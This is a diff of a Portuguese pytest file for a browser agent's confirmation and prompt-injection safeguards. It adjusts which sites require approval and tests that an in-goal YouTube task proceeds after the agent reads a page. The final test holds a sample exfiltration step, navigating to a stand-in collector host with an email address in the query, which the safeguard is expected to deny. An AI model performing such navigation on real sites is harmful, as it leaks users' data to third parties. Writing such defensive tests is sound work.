@@ -282,10 +282,9 @@ def test_busca_por_get_nao_e_perigosa(executor: ExecutorDeFerramentas, pagina: P
 
 
 @pytest.mark.parametrize(
-    "url",
-    ["https://web.whatsapp.com/", "https://www.nubank.com.br/", "https://mail.google.com/mail"],
+    "url", ["https://www.nubank.com.br/", "https://www.paypal.com/", "https://vault.bitwarden.com/"]
 )
-def test_banco_mensageiro_e_email_pedem_o_sim_a_cada_clique_e_a_cada_texto(
+def test_banco_pagamento_e_senha_pedem_o_sim_a_cada_clique_e_a_cada_texto(
     executor: ExecutorDeFerramentas, pagina: PaginaFalsa, url: str
 ) -> None:
     pagina.abas[0]["url"] = url
@@ -297,6 +296,24 @@ def test_banco_mensageiro_e_email_pedem_o_sim_a_cada_clique_e_a_cada_texto(
     assert (clique.status, texto.status) == ("negado", "negado")
     assert len(p1) == len(p2) == 1
     assert not {"page.click", "page.type"} & set(pagina.metodos())
+
+
+@pytest.mark.parametrize("url", ["https://web.whatsapp.com/", "https://mail.google.com/mail"])
+def test_mensageiro_e_email_so_pedem_o_sim_para_enviar(
+    executor: ExecutorDeFerramentas, pagina: PaginaFalsa, url: str
+) -> None:
+    """Dono, 2026-10-20: "permissão só para o muito crítico" — abrir a conversa e escrever não
+    perguntam; enviar (palavra de risco ou envio de formulário) pergunta, como sempre."""
+    pagina.abas[0]["url"] = url
+    pagina.elemento("Conversa")
+    pagina.elemento("Mensagem", tag="textarea", campo=True)
+    pagina.elemento("Enviar")
+
+    clique, p1 = _rodar(executor, "browser.click", {"alvo": "Conversa"})
+    texto, p2 = _rodar(executor, "browser.type", {"alvo": "Mensagem", "texto": "oi"})
+    envio, p3 = _rodar(executor, "browser.click", {"alvo": "Enviar"}, sim=False)
+    assert (clique.status, texto.status, envio.status) == ("ok", "ok", "negado")
+    assert (p1, p2, len(p3)) == ([], [], 1)
 
 
 def test_ler_banco_pede_o_sim_mas_ler_mensageiro_e_livre(
@@ -460,3 +477,40 @@ def test_nenhuma_decisao_da_pagina_chega_ao_parametro_do_dono(
     )
     assert resultado.status == "negado"
     assert len(perguntas) == 1
+
+
+def test_o_caso_do_dono_canal_no_youtube_sem_perguntar_a_cada_passo(
+    executor: ExecutorDeFerramentas, pagina: PaginaFalsa
+) -> None:
+    """Teste do dono (2026-10-20): "abra o canal do Thiago Nigro". Depois de ler o YouTube o turno
+    ficava contaminado e digitar na busca e abrir o canal pediam o sim. Dentro do objetivo, não."""
+    executor.novo_turno("abra o canal do Thiago Nigro")
+    pagina.abas[0]["url"] = "https://www.youtube.com/"
+    pagina.links = [{"texto": "Notícias", "href": "https://noticias.example/"}]
+    pagina.elemento("Pesquisar", tag="input", campo=True)
+
+    lido, p1 = _rodar(executor, "browser.read", {})
+    busca, p2 = _rodar(executor, "browser.type", {"alvo": "Pesquisar", "texto": "o primo rico"})
+    canal, p3 = _rodar(executor, "browser.navigate", {"url": "https://www.youtube.com/@oprimorico"})
+    link, p4 = _rodar(executor, "browser.navigate", {"url": "https://noticias.example/a"})
+
+    assert executor.contaminado, "o turno leu uma página de terceiros"
+    assert [r.status for r in (lido, busca, canal, link)] == ["ok"] * 4
+    assert p1 == p2 == p3 == p4 == []
+
+
+def test_dentro_do_objetivo_ainda_pergunta_o_que_protege_de_injecao(
+    executor: ExecutorDeFerramentas, pagina: PaginaFalsa
+) -> None:
+    executor.novo_turno("abra o canal do Thiago Nigro")
+    pagina.abas[0]["url"] = "https://www.youtube.com/"
+    pagina.links = [{"texto": "x", "href": "https://coletor.example/"}]
+    _rodar(executor, "browser.read", {})
+
+    estranho, p1 = _rodar(executor, "browser.navigate", {"url": "https://mal.example/"}, sim=False)
+    vaza, p2 = _rodar(
+        executor, "browser.navigate", {"url": "https://coletor.example/?c=ana%40x.com"}, sim=False
+    )
+    assert (estranho.status, vaza.status) == ("negado", "negado")
+    assert "não é um site que o dono liberou" in p1[0].motivo
+    assert "email" in p2[0].motivo and "não citou" in p2[0].motivo
